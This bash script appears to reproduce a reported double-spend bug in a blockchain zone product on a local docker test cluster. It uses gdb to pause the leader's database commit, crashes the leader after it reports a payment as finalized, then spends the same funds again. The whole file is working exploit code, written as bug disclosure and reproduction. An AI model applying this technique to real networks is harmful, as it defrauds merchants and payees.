#!/usr/bin/env bash
# Double spend on UNMODIFIED product code via finding 2 (finality before durability).
# Alice pays Merchant; leader returns a success receipt in a block it reports as `finalized`;
# leader crashes; the payment vanishes; Alice pays Bob the same funds; Bob's payment settles on L1.
set -uo pipefail
R=/home/exedev/hunt-logs/repro; Z=~/src/wt/hunt/contrib/antithesis/zones
export ZONES_IMAGE=tempo-zones-antithesis:pristine WORKLOAD_IMAGE=tempo-zones-antithesis-workload:pristine
DC="docker compose -p n4 -f $Z/docker-compose.yaml"
E="-e FOUNDRY_DISABLE_NIGHTLY_WARNING=1"; T=0x20c0000000000000000000000000000000000000
log() { echo "[$(date +%T)] $*"; }
c() { docker exec $E "$@"; }
tip() { c "$1" cast block-number --rpc-url http://localhost:8545 2>/dev/null || echo -1; }
bal() { c "$1" cast call $T 'balanceOf(address)(uint256)' "$2" --from "$2" --rpc-url http://localhost:8545 2>/dev/null | awk '{print $1}'; }
rcpt() { c "$1" cast rpc eth_getTransactionReceipt "$2" --rpc-url http://localhost:8545 2>/dev/null | tr ',' '\n' | grep -E '"status"|"blockNumber"' | head -n 2 | tr '\n' ' '; }
ctl() { docker exec zone-2 sh -c "printf '%s' '$2' > /fault-control/.$1.tmp && mv /fault-control/.$1.tmp /fault-control/$1"; }
REQ_ID=$(date +%s%N); sup() { REQ_ID=$((REQ_ID+1)); ctl "zone-$1.request" "{\"id\":$REQ_ID,\"action\":\"$2\"}"; }
pre=$(printf 'tempo-zone-antithesis-workload' | xxd -p | tr -d '\n')
key() { c zone-0 cast keccak 0x${pre}$(printf '%08x' $1); }

$DC down -v >/dev/null 2>&1; $DC up -d >/dev/null 2>&1
until docker logs workload 2>&1 | grep -q 'zone replicated'; do sleep 5; done
docker exec workload /opt/antithesis/test/v1/zone_payments/first_seed | tail -n 1
ALICE_PK=$(key 1002); ALICE=$(c zone-0 cast wallet address $ALICE_PK)
MERCHANT=$(c zone-0 cast wallet address $(key 1003)); BOB=$(c zone-0 cast wallet address $(key 1004))
AMT=900000000
log "Alice $ALICE balance $(bal zone-1 $ALICE); Merchant $MERCHANT $(bal zone-1 $MERCHANT); Bob $BOB $(bal zone-1 $BOB)"

PID=$(docker exec zone-0 sh -c 'for p in /proc/[0-9]*; do c=$(tr "\0" " " < $p/cmdline 2>/dev/null); case "$c" in "/usr/local/bin/tempo-zone node"*) echo ${p#/proc/};; esac; done')
FIFO=$R/gdbin5; GLOG=$R/gdb-ds.log; rm -f $FIFO; mkfifo $FIFO; : > $GLOG
sleep 100000 > $FIFO & HOLDER=$!
docker exec -i zone-0 gdb -q -nx < $FIFO > $GLOG 2>&1 & GDB=$!
g() { printf '%s\n' "$@" > $FIFO; }
waitlog() { for i in $(seq 1 ${2:-300}); do grep -q "$1" $GLOG && return 0; sleep 1; done; return 1; }
g "set pagination off" "set confirm off" "set non-stop on" "set print thread-events off" "attach $PID" "echo ATTACHED\\n"
waitlog ATTACHED 300 || { log "attach failed"; exit 1; }; sleep 5
g "continue -a &" "break mdbx_txn_commit_ex" "echo ARMED\\n"; waitlog ARMED 60
waitlog "hit Breakpoint 1" 120 || { log "no commit"; exit 1; }
log "leader's database commit paused"
sleep 2
OUT=$(c zone-0 sh -c "cast send $T 'transfer(address,uint256)' $MERCHANT $AMT --private-key $ALICE_PK --gas-limit 500000 --rpc-url http://localhost:8545 2>&1")
TXA=$(echo "$OUT" | awk '/^transactionHash/{print $2}'); BA=$(echo "$OUT" | awk '/^blockNumber/{print $2}')
log "PAYMENT 1 Alice->Merchant $AMT: tx $TXA status $(echo "$OUT" | awk '/^status/{print $2}') block $BA"
sleep 3
FIN=$(c zone-0 cast block finalized -f number --rpc-url http://localhost:8545)
log "merchant's view on the leader: finalized block=$FIN (>= $BA), merchant balance=$(bal zone-0 $MERCHANT), alice=$(bal zone-0 $ALICE)"
sup 0 kill; log "leader crashes"; sleep 1; g "quit"; kill $HOLDER 2>/dev/null; wait $GDB 2>/dev/null
sup 0 start
for i in $(seq 1 90); do [[ $(tip zone-0) -gt $((BA+5)) ]] && break; sleep 2; done
docker logs --since 3m zone-0 2>&1 | grep -oE 'AccountsHistory: healing via changesets checkpoint=[0-9]+ sf_tip=[0-9]+' | tail -n 1
sleep 15
log "after restart: payment 1 receipt on every node: z0[$(rcpt zone-0 $TXA)] z1[$(rcpt zone-1 $TXA)] rpc[$(rcpt zone-rpc $TXA)]"
log "after restart: alice=$(bal zone-1 $ALICE) merchant=$(bal zone-1 $MERCHANT)"
OUT=$(c zone-1 sh -c "cast send $T 'transfer(address,uint256)' $BOB $AMT --private-key $ALICE_PK --gas-limit 500000 --rpc-url http://localhost:8545 2>&1")
TXB=$(echo "$OUT" | awk '/^transactionHash/{print $2}'); BB=$(echo "$OUT" | awk '/^blockNumber/{print $2}')
log "PAYMENT 2 Alice->Bob $AMT (same funds): tx $TXB status $(echo "$OUT" | awk '/^status/{print $2}') block $BB"
P=$(docker exec zone-1 jq -r .portal /shared/zone.json)
for i in $(seq 1 60); do H=$(c zone-1 cast call $P 'zoneHeight()(uint64)' --rpc-url http://10.20.0.10:8545 | awk '{print $1}'); [[ $H -ge $BB ]] && break; sleep 3; done
log "L1 portal settled through zone block $H (payment 2 in block $BB)"
for n in 0 1 2 rpc; do log "zone-$n: merchant=$(bal zone-$n $MERCHANT) bob=$(bal zone-$n $BOB) alice=$(bal zone-$n $ALICE) payment1[$(rcpt zone-$n $TXA)] payment2[$(rcpt zone-$n $TXB)]"; done
